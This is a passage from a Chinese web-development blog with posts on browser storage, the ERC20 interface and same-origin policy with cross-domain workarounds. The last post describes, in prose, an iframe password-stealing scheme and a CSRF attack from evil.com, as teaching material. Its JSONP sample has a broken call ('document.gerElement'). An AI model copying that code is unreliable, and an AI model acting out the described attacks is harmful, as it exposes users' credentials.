                <a href="/2019/10/17/详说Cookie-LocalStorage与SessionStorage/" class="post-title-link" itemprop="url">详说Cookie,LocalStorage与SessionStorage</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-10-17 10:44:44 / 修改时间：10:45:07" itemprop="dateCreated datePublished" datetime="2019-10-17T10:44:44+08:00">2019-10-17</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>Cookie 是小甜饼的意思。顾名思义，cookie 确实非常小，它的大小限制为4KB左右，是网景公司的前雇员 Lou Montulli 在1993年3月的发明。它的主要用途有保存登录信息，比如你登录某个网站市场可以看到“记住密码”，这通常就是通过在 Cookie 中存入一段辨别用户身份的数据来实现的。</p>
<h4 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h4><p>localStorage 是 HTML5 标准中新加入的技术，它并不是什么划时代的新东西。早在 IE 6 时代，就有一个叫 userData 的东西用于本地存储，而当时考虑到浏览器兼容性，更通用的方案是使用 Flash。而如今，localStorage 被大多数浏览器所支持，如果你的网站需要支持 IE6+，那以 userData 作为你的 polyfill 的方案是种不错的选择。</p>
<table>
<thead>
<tr>
<th>特性</th>
<th>Chrome</th>
<th>Firefox (Gecko)</th>
<th>Internet Explorer</th>
<th>Opera</th>
<th>Safari (WebKit)</th>
</tr>
</thead>
<tbody><tr>
<td>localStorage</td>
<td>4</td>
<td>3.5</td>
<td>8</td>
<td>10.50</td>
<td>4</td>
</tr>
<tr>
<td>sessionStorage</td>
<td>5</td>
<td>2</td>
<td>8</td>
<td>10.50</td>
<td>4</td>
</tr>
</tbody></table>
<h4 id="sessionStorage"><a href="#sessionStorage" class="headerlink" title="sessionStorage"></a>sessionStorage</h4><p>sessionStorage 与 localStorage 的接口类似，但保存数据的生命周期与 localStorage 不同。做过后端开发的同学应该知道 Session 这个词的意思，直译过来是“会话”。而 sessionStorage 是一个前端的概念，它只是可以将一部分数据在当前会话中保存下来，刷新页面数据依旧存在。但当页面关闭后，sessionStorage 中的数据就会被清空。</p>
<h2 id="三者的异同"><a href="#三者的异同" class="headerlink" title="三者的异同"></a>三者的异同</h2><table>
<thead>
<tr>
<th>特性</th>
<th>Cookie</th>
<th>localStorage</th>
<th>sessionStorage</th>
</tr>
</thead>
<tbody><tr>
<td>数据的生命期</td>
<td>一般由服务器生成，可设置失效时间。如果在浏览器端生成Cookie，默认是关闭浏览器后失效</td>
<td>除非被清除，否则永久保存</td>
<td>仅在当前会话下有效，关闭页面或浏览器后被清除</td>
</tr>
<tr>
<td>存放数据大小</td>
<td>4K左右</td>
<td>一般为5MB</td>
<td></td>
</tr>
<tr>
<td>与服务器端通信</td>
<td>每次都会携带在HTTP头中，如果使用cookie保存过多数据会带来性能问题</td>
<td>仅在客户端（即浏览器）中保存，不参与和服务器的通信</td>
<td></td>
</tr>
<tr>
<td>易用性</td>
<td>需要程序员自己封装，源生的Cookie接口不友好</td>
<td>源生接口可以接受，亦可再次封装来对Object和Array有更好的支持</td>
<td></td>
</tr>
</tbody></table>
<h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4><p>有了对上面这些差别的直观理解，我们就可以讨论三者的应用场景了。</p>
<p>因为考虑到每个 HTTP 请求都会带着 Cookie 的信息，所以 Cookie 当然是能精简就精简啦，比较常用的一个应用场景就是判断用户是否登录。针对登录过的用户，服务器端会在他登录时往 Cookie 中插入一段加密过的唯一辨识单一用户的辨识码，下次只要读取这个值就可以判断当前用户是否登录啦。曾经还使用 Cookie 来保存用户在电商网站的购物车信息，如今有了 localStorage，似乎在这个方面也可以给 Cookie 放个假了~</p>
<p>而另一方面 localStorage 接替了 Cookie 管理购物车的工作，同时也能胜任其他一些工作。比如HTML5游戏通常会产生一些本地数据，localStorage 也是非常适用的。如果遇到一些内容特别多的表单，为了优化用户体验，我们可能要把表单页面拆分成多个子页面，然后按步骤引导用户填写。这时候 sessionStorage 的作用就发挥出来了。</p>
<h2 id="安全性的考虑"><a href="#安全性的考虑" class="headerlink" title="安全性的考虑"></a>安全性的考虑</h2><p>需要注意的是，不是什么数据都适合放在 Cookie、localStorage 和 sessionStorage 中的。使用它们的时候，需要时刻注意是否有代码存在 XSS 注入的风险。因为只要打开控制台，你就随意修改它们的值，也就是说如果你的网站中有 XSS 的风险，它们就能对你的 localStorage 肆意妄为。所以千万不要用它们存储你系统中的敏感数据。</p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/16/ERC20标准/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VegyChick">
      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="菜鸟博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/10/16/ERC20标准/" class="post-title-link" itemprop="url">ERC20标准</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-10-16 19:30:58 / 修改时间：19:31:19" itemprop="dateCreated datePublished" datetime="2019-10-16T19:30:58+08:00">2019-10-16</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="ERC20标准涵盖了哪些内容？"><a href="#ERC20标准涵盖了哪些内容？" class="headerlink" title="ERC20标准涵盖了哪些内容？"></a>ERC20标准涵盖了哪些内容？</h2><p>我们可以在<a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md查看ERC20代币的标准API。" target="_blank" rel="noopener">https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md查看ERC20代币的标准API。</a></p>
<h3 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h3><p>在Method目录下面我们可以看到一些方法，所有的ERC20代币都是按照下面这些方法来定义的。下面我们讲解一下每个方法的作用。<br>name<br>function name() constant returns (string name)<br>返回string类型的ERC20代币的名字，例如：StatusNetwork<br>symbol<br>function symbol() constant returns (string symbol)<br>返回string类型的ERC20代币的符号，也就是代币的简称，例如：SNT。<br>decimals<br>function decimals() constant returns (uint8 decimals)<br>支持几位小数点后几位。如果设置为3。也就是支持0.001表示。<br>totalSupply<br>function totalSupply() constant returns (uint256 totalSupply)<br>发行代币的总量，可以通过这个函数来获取。所有智能合约发行的代币总量是一定的，totalSupply必须设置初始值。如果不设置初始值，这个代币发行就说明有问题。<br>balanceOf<br>function balanceOf(address _owner) constant returns (uint256 balance)<br>输入地址，可以获取该地址代币的余额。<br>transfer<br>function transfer(address _to, uint256 _value) returns (bool success)<br>调用transfer函数将自己的token转账给_to地址，_value为转账个数<br>approve<br>function approve(address _spender, uint256 _value) returns (bool success)<br>批准_spender账户从自己的账户转移_value个token。可以分多次转移。<br>transferFrom<br>function transferFrom(address _from, address _to, uint256 _value) returns (bool success)<br>与approve搭配使用，approve批准之后，调用transferFrom函数来转移token。<br>allowance<br>function allowance(address _owner, address _spender) constant returns (uint256 remaining)<br>返回_spender还能提取token的个数。<br>approve、transferFrom及allowance解释：<br>账户A有1000个ETH，想允许B账户随意调用100个ETH。A账户按照以下形式调用approve函数approve(B,100)。当B账户想用这100个ETH中的10个ETH给C账户时，则调用transferFrom(A, C, 10)。这时调用allowance(A, B)可以查看B账户还能够调用A账户多少个token。</p>
<h3 id="Events"><a href="#Events" class="headerlink" title="Events"></a>Events</h3><p>Transfer<br>event Transfer(address indexed _from, address indexed _to, uint256 _value)<br>当成功转移token时，一定要触发Transfer事件<br>Approval<br>event Approval(address indexed _owner, address indexed _spender, uint256 _value)<br>当调用approval函数成功时，一定要触发Approval事件</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果项目方要在以太坊上发行代币来进行融资，一定会按照这个标准来实现相应的函数。</p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/16/几大流行公链github代码注释翻译版本/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VegyChick">
      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="菜鸟博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/10/16/几大流行公链github代码注释翻译版本/" class="post-title-link" itemprop="url">几大流行公链github代码注释翻译版本</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-10-16 19:27:52 / 修改时间：19:29:05" itemprop="dateCreated datePublished" datetime="2019-10-16T19:27:52+08:00">2019-10-16</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><a href="https://github.com/yinchengtsinghua" target="_blank" rel="noopener">https://github.com/yinchengtsinghua</a></p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/13/浏览器同源策略及跨域解决方案/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VegyChick">
      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="菜鸟博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/10/13/浏览器同源策略及跨域解决方案/" class="post-title-link" itemprop="url">浏览器同源策略及跨域解决方案</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-10-13 13:09:07 / 修改时间：13:15:16" itemprop="dateCreated datePublished" datetime="2019-10-13T13:09:07+08:00">2019-10-13</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="浏览器同源策略及跨域的解决方法"><a href="#浏览器同源策略及跨域的解决方法" class="headerlink" title="浏览器同源策略及跨域的解决方法"></a><a href="https://www.cnblogs.com/laixiangran/p/9064769.html" target="_blank" rel="noopener">浏览器同源策略及跨域的解决方法</a></h1><h2 id="什么是浏览器同源策略"><a href="#什么是浏览器同源策略" class="headerlink" title="什么是浏览器同源策略"></a>什么是浏览器同源策略</h2><p>同源策略（Same origin policy）是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说 Web 是构建在同源策略基础之上的，浏览器只是针对同源策略的一种实现。</p>
<p>它的核心就在于它认为自任何站点装载的信赖内容是不安全的。当被浏览器半信半疑的脚本运行在沙箱时，它们应该只被允许访问来自同一站点的资源，而不是那些来自其它站点可能怀有恶意的资源。</p>
<p>所谓同源是指：域名、协议、端口相同。</p>
<p>下表是相对于 <code>http://www.laixiangran.cn/home/index.html</code> 的同源检测结果：</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/9932BCD648DE4CACB29A563116CE962B?method=download&shareKey=7fad5abd13151856c933a2bc9064a83a" alt="img"></p>
<p>另外，同源策略又分为以下两种：</p>
<ol>
<li>DOM 同源策略：禁止对不同源页面 DOM 进行操作。这里主要场景是 iframe 跨域的情况，不同域名的 iframe 是限制互相访问的。</li>
<li>XMLHttpRequest 同源策略：禁止使用 XHR 对象向不同源的服务器地址发起 HTTP 请求。</li>
</ol>
<h2 id="为什么要有跨域限制"><a href="#为什么要有跨域限制" class="headerlink" title="为什么要有跨域限制"></a>为什么要有跨域限制</h2><p>因为存在浏览器同源策略，所以才会有跨域问题。那么浏览器是出于何种原因会有跨域的限制呢。其实不难想到，跨域限制主要的目的就是为了用户的上网安全。</p>
<p>如果浏览器没有同源策略，会存在什么样的安全问题呢。下面从 DOM 同源策略和 XMLHttpRequest 同源策略来举例说明：</p>
<p><strong>如果没有 DOM 同源策略，也就是说不同域的 iframe 之间可以相互访问，那么黑客可以这样进行攻击：</strong></p>
<ol>
<li>做一个假网站，里面用 iframe 嵌套一个银行网站 <code>http://mybank.com</code>。</li>
<li>把 iframe 宽高啥的调整到页面全部，这样用户进来除了域名，别的部分和银行的网站没有任何差别。</li>
<li>这时如果用户输入账号密码，我们的主网站可以跨域访问到 <code>http://mybank.com</code> 的 dom 节点，就可以拿到用户的账户密码了。</li>
</ol>
<p><strong>如果 XMLHttpRequest 同源策略，那么黑客可以进行 CSRF（跨站请求伪造） 攻击：</strong></p>
<ol>
<li>用户登录了自己的银行页面 <code>http://mybank.com</code>，<code>http://mybank.com</code> 向用户的 cookie 中添加用户标识。</li>
<li>用户浏览了恶意页面 <code>http://evil.com</code>，执行了页面中的恶意 AJAX 请求代码。</li>
<li><code>http://evil.com</code> 向 <code>http://mybank.com</code> 发起 AJAX HTTP 请求，请求会默认把 <code>http://mybank.com</code> 对应 cookie 也同时发送过去。</li>
<li>银行页面从发送的 cookie 中提取用户标识，验证用户无误，response 中返回请求数据。此时数据就泄露了。</li>
<li>而且由于 Ajax 在后台执行，用户无法感知这一过程。</li>
</ol>
<p>因此，有了浏览器同源策略，我们才能更安全的上网。</p>
<h2 id="跨域的解决方法"><a href="#跨域的解决方法" class="headerlink" title="跨域的解决方法"></a>跨域的解决方法</h2><p>从上面我们了解到了浏览器同源策略的作用，也正是有了跨域限制，才使我们能安全的上网。但是在实际中，有时候我们需要突破这样的限制，因此下面将介绍几种跨域的解决方法。</p>
<h3 id="CORS（跨域资源共享）"><a href="#CORS（跨域资源共享）" class="headerlink" title="CORS（跨域资源共享）"></a>CORS（跨域资源共享）</h3><p>CORS（Cross-origin resource sharing，跨域资源共享）是一个 W3C 标准，定义了在必须访问跨域资源时，浏览器与服务器应该如何沟通。CORS 背后的基本思想，就是使用自定义的 HTTP 头部让浏览器与服务器进行沟通，从而决定请求或响应是应该成功，还是应该失败。</p>
<p>CORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE 浏览器不能低于 IE10。</p>
<p>整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS 通信与同源的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX 请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。</p>
<p>因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨源通信。</p>
<p>浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。</p>
<p>只要同时满足以下两大条件，就属于<strong>简单请求</strong>。</p>
<ol>
<li>请求方法是以下三种方法之一：</li>
</ol>
<ul>
<li>HEAD</li>
<li>GET</li>
<li>POST</li>
</ul>
<ol>
<li>HTTP的头信息不超出以下几种字段：</li>
</ol>
<ul>
<li>Accept</li>
<li>Accept-Language</li>
<li>Content-Language</li>
<li>Last-Event-ID</li>
<li>Content-Type：只限于三个值 application/x-www-form-urlencoded、multipart/form-data、text/plain</li>
</ul>
<p>凡是不同时满足上面两个条件，就属于<strong>非简单请求</strong>。</p>
<p>浏览器对这两种请求的处理，是不一样的。</p>
<h4 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h4><ol>
<li>在请求中需要附加一个额外的 Origin 头部，其中包含请求页面的源信息（协议、域名和端口），以便服务器根据这个头部信息来决定是否给予响应。例如：<code>Origin: http://www.laixiangran.cn</code></li>
<li>如果服务器认为这个请求可以接受，就在 Access-Control-Allow-Origin 头部中回发相同的源信息（如果是公共资源，可以回发 * ）。例如：<code>Access-Control-Allow-Origin：http://www.laixiangran.cn</code></li>
<li>没有这个头部或者有这个头部但源信息不匹配，浏览器就会驳回请求。正常情况下，浏览器会处理请求。注意，请求和响应都不包含 cookie 信息。</li>
<li>如果需要包含 cookie 信息，ajax 请求需要设置 xhr 的属性 withCredentials 为 true，服务器需要设置响应头部 <code>Access-Control-Allow-Credentials: true</code>。</li>
</ol>
<h4 id="非简单请求"><a href="#非简单请求" class="headerlink" title="非简单请求"></a>非简单请求</h4><p>浏览器在发送真正的请求之前，会先发送一个 Preflight 请求给服务器，这种请求使用 OPTIONS 方法，发送下列头部：</p>
<ul>
<li>Origin：与简单的请求相同。</li>
<li>Access-Control-Request-Method: 请求自身使用的方法。</li>
<li>Access-Control-Request-Headers: （可选）自定义的头部信息，多个头部以逗号分隔。</li>
</ul>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Origin: http://www.laixiangran.cn</span><br><span class="line">Access-Control-Request-Method: POST</span><br><span class="line">Access-Control-Request-Headers: NCZ</span><br></pre></td></tr></table></figure>

<p>发送这个请求后，服务器可以决定是否允许这种类型的请求。服务器通过在响应中发送如下头部与浏览器进行沟通：</p>
<ul>
<li>Access-Control-Allow-Origin：与简单的请求相同。</li>
<li>Access-Control-Allow-Methods: 允许的方法，多个方法以逗号分隔。</li>
<li>Access-Control-Allow-Headers: 允许的头部，多个方法以逗号分隔。</li>
<li>Access-Control-Max-Age: 应该将这个 Preflight 请求缓存多长时间（以秒表示）。</li>
</ul>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http://www.laixiangran.cn</span><br><span class="line">Access-Control-Allow-Methods: GET, POST</span><br><span class="line">Access-Control-Allow-Headers: NCZ</span><br><span class="line">Access-Control-Max-Age: 1728000</span><br></pre></td></tr></table></figure>

<p>一旦服务器通过 Preflight 请求允许该请求之后，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样了。</p>
<h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ul>
<li>CORS 通信与同源的 AJAX 通信没有差别，代码完全一样，容易维护。</li>
<li>支持所有类型的 HTTP 请求。</li>
</ul>
<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ul>
<li>存在兼容性问题，特别是 IE10 以下的浏览器。</li>
<li>第一次发送非简单请求时会多一次请求。</li>
</ul>
<h3 id="JSONP-跨域"><a href="#JSONP-跨域" class="headerlink" title="JSONP 跨域"></a>JSONP 跨域</h3><p>由于 <code>script</code> 标签不受浏览器同源策略的影响，允许跨域引用资源。因此可以通过动态创建 script 标签，然后利用 src 属性进行跨域，这也就是 JSONP 跨域的基本原理。</p>
<p>直接通过下面的例子来说明 JSONP 实现跨域的流程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// 1. 定义一个 回调函数 handleResponse 用来接收返回的数据</span><br><span class="line">function handleResponse(data) &#123;</span><br><span class="line">    console.log(data);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 2. 动态创建一个 script 标签，并且告诉后端回调函数名叫 handleResponse</span><br><span class="line">var body = document.getElementsByTagName(&apos;body&apos;)[0];</span><br><span class="line">var script = document.gerElement(&apos;script&apos;);</span><br><span class="line">script.src = &apos;http://www.laixiangran.cn/json?callback=handleResponse&apos;;</span><br><span class="line">body.appendChild(script);</span><br><span class="line"></span><br><span class="line">// 3. 通过 script.src 请求 `http://www.laixiangran.cn/json?callback=handleResponse`，</span><br><span class="line">// 4. 后端能够识别这样的 URL 格式并处理该请求，然后返回 handleResponse(&#123;&quot;name&quot;: &quot;laixiangran&quot;&#125;) 给浏览器</span><br><span class="line">// 5. 浏览器在接收到 handleResponse(&#123;&quot;name&quot;: &quot;laixiangran&quot;&#125;) 之后立即执行 ，也就是执行 handleResponse 方法，获得后端返回的数据，这样就完成一次跨域请求了。</span><br></pre></td></tr></table></figure>

<h4 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h4><ul>
<li>使用简便，没有兼容性问题，目前最流行的一种跨域方法。</li>
</ul>
<h4 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h4><ul>
<li>只支持 GET 请求。</li>
<li>由于是从其它域中加载代码执行，因此如果其他域不安全，很可能会在响应中夹带一些恶意代码。</li>
<li>要确定 JSONP 请求是否失败并不容易。虽然 HTML5 给 script 标签新增了一个 onerror 事件处理程序，但是存在兼容性问题。</li>
</ul>
<h3 id="图像-Ping-跨域"><a href="#图像-Ping-跨域" class="headerlink" title="图像 Ping 跨域"></a>图像 Ping 跨域</h3><p>由于 <code>img</code> 标签不受浏览器同源策略的影响，允许跨域引用资源。因此可以通过 img 标签的 src 属性进行跨域，这也就是图像 Ping 跨域的基本原理。</p>
<p>直接通过下面的例子来说明图像 Ping 实现跨域的流程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var img = new Image();</span><br><span class="line"></span><br><span class="line">// 通过 onload 及 onerror 事件可以知道响应是什么时候接收到的，但是不能获取响应文本</span><br><span class="line">img.onload = img.onerror = function() &#123;</span><br><span class="line">    console.log(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 请求数据通过查询字符串形式发送</span><br><span class="line">img.src = &apos;http://www.laixiangran.cn/test?name=laixiangran&apos;;</span><br></pre></td></tr></table></figure>

<h4 id="优点-2"><a href="#优点-2" class="headerlink" title="优点"></a>优点</h4><ul>
<li>用于实现跟踪用户点击页面或动态广告曝光次数有较大的优势。</li>
</ul>
<h4 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h4><ul>
<li>只支持 GET 请求。</li>
<li>只能浏览器与服务器的单向通信，因为浏览器不能访问服务器的响应文本。</li>
</ul>
<h3 id="服务器代理"><a href="#服务器代理" class="headerlink" title="服务器代理"></a>服务器代理</h3><p>浏览器有跨域限制，但是服务器不存在跨域问题，所以可以由服务器请求所要域的资源再返回给客户端。</p>
<p>服务器代理是万能的。</p>
<h3 id="document-domain-跨域"><a href="#document-domain-跨域" class="headerlink" title="document.domain 跨域"></a>document.domain 跨域</h3><p>对于主域名相同，而子域名不同的情况，可以使用 document.domain 来跨域。这种方式非常适用于 iframe 跨域的情况。</p>
<p>比如，有一个页面，它的地址是 <code>http://www.laixiangran.cn/a.html</code>，在这个页面里面有一个 iframe，它的 src 是 <code>http://laixiangran.cn/b.html</code>。很显然，这个页面与它里面的 iframe 框架是不同域的，所以我们是无法通过在页面中书写 js 代码来获取 iframe 中的东西的。</p>
<p>这个时候，document.domain 就可以派上用场了，我们只要把 <code>http://www.laixiangran.cn/a.html</code> 和 <code>http://laixiangran.cn/b.html</code> 这两个页面的 document.domain 都设成相同的域名就可以了。但要注意的是，document.domain 的设置是有限制的，我们只能把 document.domain 设置成自身或更高一级的父域，且主域必须相同。例如：<code>a.b.laixiangran.cn</code> 中某个文档的 document.domain 可以设成 <code>a.b.laixiangran.cn</code>、<code>b.laixiangran.cn</code> 、<code>laixiangran.cn</code> 中的任意一个，但是不可以设成 <code>c.a.b.laixiangran.cn</code> ，因为这是当前域的子域，也不可以设成 <code>baidu.com</code>，因为主域已经不相同了。</p>
<p>例如，在页面 <code>http://www.laixiangran.cn/a.html</code> 中设置document.domain：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://laixiangran.cn/b.html&quot; id=&quot;myIframe&quot; onload=&quot;test()&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    document.domain = &apos;laixiangran.cn&apos;; // 设置成主域</span><br><span class="line">    function test() &#123;</span><br><span class="line">        console.log(document.getElementById(&apos;myIframe&apos;).contentWindow);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>在页面 <code>http://laixiangran.cn/b.html</code> 中也设置 document.domain，而且这也是必须的，虽然这个文档的 domain 就是 <code>laixiangran.cn</code>，但是还是必须显式地设置 document.domain 的值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    document.domain = &apos;laixiangran.cn&apos;; // document.domain 设置成与主页面相同</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>这样，<code>http://www.laixiangran.cn/a.html</code> 就可以通过 js 访问到 <code>http://laixiangran.cn/b.html</code> 中的各种属性和对象了。</p>
<h3 id="window-name-跨域"><a href="#window-name-跨域" class="headerlink" title="window.name 跨域"></a>window.name 跨域</h3><p>window 对象有个 name 属性，该属性有个特征：即在一个窗口（window）的生命周期内，窗口载入的所有的页面（不管是相同域的页面还是不同域的页面）都是共享一个 <code>window.name</code> 的，每个页面对 <code>window.name</code> 都有读写的权限，<code>window.name</code> 是持久存在一个窗口载入过的所有页面中的，并不会因新页面的载入而进行重置。</p>
<p>通过下面的例子介绍如何通过 window.name 来跨域获取数据的。</p>
<p>页面 <code>http://www.laixiangran.cn/a.html</code> 的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://laixiangran.cn/b.html&quot; id=&quot;myIframe&quot; onload=&quot;test()&quot; style=&quot;display: none;&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    // 2. iframe载入 &quot;http://laixiangran.cn/b.html 页面后会执行该函数</span><br><span class="line">    function test() &#123;</span><br><span class="line">        var iframe = document.getElementById(&apos;myIframe&apos;);</span><br><span class="line">        </span><br><span class="line">        // 重置 iframe 的 onload 事件程序，</span><br><span class="line">        // 此时经过后面代码重置 src 之后，</span><br><span class="line">        // http://www.laixiangran.cn/a.html 页面与该 iframe 在同一个源了，可以相互访问了</span><br><span class="line">        iframe.onload = function() &#123;</span><br><span class="line">            var data = iframe.contentWindow.name; // 4. 获取 iframe 里的 window.name</span><br><span class="line">            console.log(data); // hello world!</span><br><span class="line">        &#125;;</span><br><span class="line">        </span><br><span class="line">        // 3. 重置一个与 http://www.laixiangran.cn/a.html 页面同源的页面</span><br><span class="line">        iframe.src = &apos;http://www.laixiangran.cn/c.html&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>页面 <code>http://laixiangran.cn/b.html</code> 的代码：</p>
